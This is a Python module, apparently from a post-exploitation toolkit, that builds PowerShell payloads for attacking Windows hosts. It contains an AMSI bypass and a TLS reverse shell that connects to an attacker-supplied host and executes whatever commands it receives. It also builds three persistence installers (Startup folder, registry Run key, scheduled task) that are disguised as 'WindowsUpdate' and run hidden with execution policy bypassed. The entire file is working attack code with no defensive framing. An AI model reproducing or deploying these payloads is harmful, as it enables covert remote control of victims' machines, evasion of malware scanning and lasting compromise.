"""
Persistence Module - Various persistence techniques
"""

def get_amsi_bypass():
    """Simple AMSI bypass for persistence payloads."""
    return '$w=[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils");$f=$w.GetField("amsiInitFailed","NonPublic,Static");$f.SetValue($null,$true)'

def get_tls_payload(ip, port, secret):
    """Generate the TLS+HMAC authenticated reverse shell payload with AMSI bypass."""
    amsi = get_amsi_bypass()
    return f"""{amsi};while($true){{try{{
$h='{ip}';$p={port};$secret='{secret}';
$t=New-Object Net.Sockets.TcpClient($h,$p);
$ssl=New-Object Net.Security.SslStream($t.GetStream(),$false,({{$true}}));
$ssl.AuthenticateAsClient($h);
$w=New-Object IO.StreamWriter($ssl);$r=New-Object IO.StreamReader($ssl);
$w.AutoFlush=$true;
$ch=$r.ReadLine();
if($ch.StartsWith("CHALLENGE:")){{
$chal=$ch.Split(":")[1];
$hmac=New-Object Security.Cryptography.HMACSHA256;
$hmac.Key=[Text.Encoding]::UTF8.GetBytes($secret);
$hash=$hmac.ComputeHash([Text.Encoding]::UTF8.GetBytes($chal));
$resp=($hash|ForEach-Object{{$_.ToString("x2")}}) -join '';
$w.WriteLine($resp);
}}
while($t.Connected){{$w.Write(">");$cmd=$r.ReadLine();if(!$cmd){{break}};$o=iex $cmd 2>&1|Out-String;$w.WriteLine($o)}}
}}catch{{}};Start-Sleep -Seconds 10}}"""

def build_startup_persistence_cmd(ip, port, secret, filename="u.ps1"):
    """Build command to install startup folder persistence."""
    tls_payload = get_tls_payload(ip, port, secret).replace("'", "''")
    return f'''$s='{tls_payload}';$p="$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{filename}";$s|Out-File $p -Force;if(Test-Path $p){{"SUCCESS"}}else{{"FAILED"}}'''

def build_registry_persistence_cmd(filename="u.ps1", taskname="WindowsUpdate"):
    """Build command to install registry Run key persistence."""
    return f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v {taskname} /d "powershell -w hidden -ep bypass -f %APPDATA%\\Microsoft\\Windows\\Start` Menu\\Programs\\Startup\\{filename}" /f'

def build_scheduled_task_cmd(filename="u.ps1", taskname="WindowsUpdate"):
    """Build command to create scheduled task persistence."""
    return f'schtasks /create /tn "{taskname}" /tr "powershell -w hidden -ep bypass -f %APPDATA%\\Microsoft\\Windows\\Start` Menu\\Programs\\Startup\\{filename}" /sc onlogon /rl highest /f'
